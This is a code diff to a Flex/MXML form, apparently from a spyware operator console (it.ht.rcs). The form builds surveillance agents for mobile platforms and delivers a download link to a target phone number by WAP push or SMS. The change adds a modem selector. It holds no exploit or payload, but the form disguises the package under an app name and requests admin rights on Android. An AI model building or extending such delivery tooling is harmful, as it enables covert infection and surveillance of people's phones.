@@ -4,35 +4,36 @@
 				 xmlns:mx="library://ns.adobe.com/flex/mx"
 				 width="100%"
 				 height="100%"
-				 xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">
+				 xmlns:build="it.ht.rcs.console.operations.view.agents.build.*" creationComplete="getModems()">
 
 	<fx:Script>
 		<![CDATA[
-      import it.ht.rcs.console.build.controller.BuildManager;
-      import it.ht.rcs.console.build.model.SymbianConf;
-      import it.ht.rcs.console.monitor.controller.LicenseManager;
-      import it.ht.rcs.console.network.controller.CollectorManager;
-      import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
-      import it.ht.rcs.console.operations.view.configuration.ConfigurationView;
-      import it.ht.rcs.console.task.controller.DownloadManager;
-      import it.ht.rcs.console.utils.AlertPopUp;
-      
-      import locale.R;
-      
-      import mx.collections.ListCollectionView;
-      import mx.core.UIComponent;
-      import mx.events.ValidationResultEvent;
-      import mx.managers.PopUpManager;
-      import mx.rpc.events.FaultEvent;
-      import mx.rpc.events.ResultEvent;
-      
-      import spark.events.TextOperationEvent;
+			import it.ht.rcs.console.build.controller.BuildManager;
+			import it.ht.rcs.console.build.model.SymbianConf;
+			import it.ht.rcs.console.modem.controller.ModemManager;
+			import it.ht.rcs.console.monitor.controller.LicenseManager;
+			import it.ht.rcs.console.network.controller.CollectorManager;
+			import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
+			import it.ht.rcs.console.operations.view.configuration.ConfigurationView;
+			import it.ht.rcs.console.task.controller.DownloadManager;
+			import it.ht.rcs.console.utils.AlertPopUp;
+
+			import locale.R;
+
+			import mx.collections.ListCollectionView;
+			import mx.core.UIComponent;
+			import mx.events.ValidationResultEvent;
+			import mx.managers.PopUpManager;
+			import mx.rpc.events.FaultEvent;
+			import mx.rpc.events.ResultEvent;
+
+			import spark.events.TextOperationEvent;
 
 			[Bindable]
 			private var urls:ListCollectionView;
-      
-      [Bindable]
-      public var configView:ConfigurationView;
+
+			[Bindable]
+			public var configView:ConfigurationView;
 
 			private var params:Object;
 
@@ -41,6 +42,9 @@
 			private var keyReference:FileReference;
 
 			private var android_file:Boolean=false;
+
+			[Bindable]
+			private var modems:ArrayCollection;
 
 			public function set platform(value:*):void
 			{
@@ -51,8 +55,8 @@
 
 				// get the list of entry points 
 				CollectorManager.instance.refresh();
-        CollectorManager.instance.getCustomRelay(onCustomRelayResponse, onCustomRelayFault)
-        //urls=CollectorManager.instance.getEntryPointsView();
+				CollectorManager.instance.getCustomRelay(onCustomRelayResponse, onCustomRelayFault)
+				//urls=CollectorManager.instance.getEntryPointsView();
 				//urls=CollectorManager.instance.getEntryPointsView();
 
 				if (value == null)
@@ -85,19 +89,39 @@
 					createBtn.demo.enabled=false;
 				}
 
+
 			}
       
-      private function onCustomRelayResponse(e:ResultEvent):void
+      private function getModems():void
       {
-      var url:*=JSON.parse(String(e.result))
+        modems=ModemManager.instance.getAvailableModems()
+        modemCb.dataProvider=modems
+        if (modems.length > 0)
+        {
+          createBtn.enabled=true
+          modem.visible=modem.includeInLayout=true;
+          noModem.visible=noModem.includeInLayout=false;
+          modemCb.selectedIndex=0
+        }
+        else
+        {
+          createBtn.enabled=false
+          noModem.visible=noModem.includeInLayout=true;
+          modem.visible=modem.includeInLayout=false;
+        }
+      }
 
-        urls=new ListCollectionView(new ArrayCollection([String(url)]))
-      }
-      
-      private function onCustomRelayFault(e:FaultEvent):void
-      {
-        urls=CollectorManager.instance.getEntryPointsView();
-      }
+			private function onCustomRelayResponse(e:ResultEvent):void
+			{
+				var url:*=JSON.parse(String(e.result))
+
+				urls=new ListCollectionView(new ArrayCollection([String(url)]))
+			}
+
+			private function onCustomRelayFault(e:FaultEvent):void
+			{
+				urls=CollectorManager.instance.getEntryPointsView();
+			}
 
 			private var fileReference:FileReference;
 
@@ -207,6 +231,7 @@
 					params={platform: 'wap', generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, sign: {}, melt: {appname: appname.text}, 'package': {type: 'remote'}}, deliver: {}};
 
 				params['deliver']['number']=number.text;
+        params['deliver']['modem_id']=modemCb.selectedItem._id;
 
 				// append the subdir to the appname
 				params['deliver']['link']=complete_with_slash(url.textInput.text) + appname.text + "/" + appname.text;
@@ -352,22 +377,21 @@
 
 				DownloadManager.instance.createTask("build", null, params, onSuccess, onFailure);
 			}
-      
-      private function onTypeSelection():void
-      {
-        if(sms.selected)
-        {
-          text.maxChars=70;
-        }
-      }
-      
-      protected function onTextChange():void
-      {
-       smsNotice.text="(max 70 char) - "+text.text.length
-        
-      }
-      
-    ]]>
+
+			private function onTypeSelection():void
+			{
+				if (sms.selected)
+				{
+					text.maxChars=70;
+				}
+			}
+
+			protected function onTextChange():void
+			{
+				smsNotice.text="(max 70 char) - " + text.text.length
+
+			}
+		]]>
 	</fx:Script>
 
 	<fx:Declarations>
@@ -385,9 +409,24 @@
 	<s:Form left="10"
 					top="10">
 		<s:FormItem label="{R.get('APPLICATION_NAME')}">
-			<s:TextInput id="appname" restrict="^ /\\"
+			<s:TextInput id="appname"
+									 restrict="^ /\\"
 									 text=""/>
 		</s:FormItem>
+		<s:FormItem label="{R.get('MODEM')}"
+								id="modem">
+			<s:ComboBox id="modemCb"
+									
+									labelField="name"/>
+		</s:FormItem>
+		<s:FormItem id="noModem"
+								visible="false"
+								includeInLayout="false">
+			<s:Label text="{R.get('NO_MODEM')}"
+							 color="0xFF0000"
+							 fontWeight="bold"/>
+		</s:FormItem>
+
 		<s:FormItem label="{R.get('PHONE_NUMBER')}">
 			<s:TextInput id="number"
 									 text=""
@@ -405,21 +444,26 @@
 				<s:RadioButton id="servloading"
 											 label="Loading"
 											 groupName="Service"
-											 selected="true" change="onTypeSelection()"/>
+											 selected="true"
+											 change="onTypeSelection()"/>
 				<s:RadioButton id="servindication"
 											 label="Indication"
-											 groupName="Service" change="onTypeSelection()"/>
+											 groupName="Service"
+											 change="onTypeSelection()"/>
 				<s:RadioButton id="sms"
 											 label="SMS"
-											 groupName="Service" change="onTypeSelection()"/>
+											 groupName="Service"
+											 change="onTypeSelection()"/>
 			</s:HGroup>
 		</s:FormItem>
 		<s:FormItem label="{R.get('TEXT')}"
 								enabled="{!servloading.selected}">
 			<s:TextInput id="text"
 									 text=""
-									 width="180" change="onTextChange()"/>
-			<s:Label text="(max 70 char)" fontSize="9"
+									 width="180"
+									 change="onTextChange()"/>
+			<s:Label text="(max 70 char)"
+							 fontSize="9"
 							 id="smsNotice"
 							 visible="{sms.selected}"
 							 includeInLayout="{sms.selected}"/>
@@ -429,7 +473,7 @@
 
 	<s:VGroup includeIn="android"
 						left="10"
-						top="190">
+						top="240">
 		<s:CheckBox left="10"
 								id="admin"
 								label="{R.get('REQUIRE_ADMIN')}"
@@ -451,7 +495,7 @@
 
 	<s:Form includeIn="blackberry"
 					left="10"
-					top="180">
+					top="230">
 		<s:FormItem label="{R.get('NAME')}">
 			<s:TextInput id="nameForm"
 									 text="RIM Compatibility Library"
@@ -476,7 +520,7 @@
 
 	<s:Form includeIn="symbian"
 					left="10"
-					top="180"
+					top="240"
 					visible="{BuildManager.instance.symbianConf.uids.length==6}">
 		<s:FormItem label="{R.get('SYMBIAN_CERT')}">
 			<s:Button width="80"
@@ -503,7 +547,7 @@
 	<!-- Symbian configuration is OK-->
 	<s:HGroup includeIn="symbian"
 						left="10"
-						top="290"
+						top="320"
 						verticalAlign="middle"
 						visible="{BuildManager.instance.symbianConf.uids.length==6}"
 						includeInLayout="{BuildManager.instance.symbianConf.uids.length==6}">
@@ -520,7 +564,7 @@
 
 	<s:HGroup includeIn="symbian"
 						left="10"
-						top="190"
+						top="240"
 						verticalAlign="middle"
 						visible="{BuildManager.instance.symbianConf.uids.length!=6}"
 						includeInLayout="{BuildManager.instance.symbianConf.uids.length!=6}">
@@ -531,11 +575,12 @@
 							click="editSymbianConf()"/>
 	</s:HGroup>
 
-	<build:CreateWithDemoButton id="createBtn"
+	<build:CreateWithDemoButton id="createBtn" 
 															left="10"
 															bottom="0"
 															right="10"
 															create="{send}"
-															visible="{currentState=='all' || currentState=='android' || currentState=='blackberry' || currentState=='multiplatform' || (currentState=='symbian' &amp;&amp; BuildManager.instance.symbianConf.uids.length==6)}" configView="{configView}"/>
+															visible="{currentState=='all' || currentState=='android' || currentState=='blackberry' || currentState=='multiplatform' || (currentState=='symbian' &amp;&amp; BuildManager.instance.symbianConf.uids.length==6)}"
+															configView="{configView}"/>
 
 </s:Group>
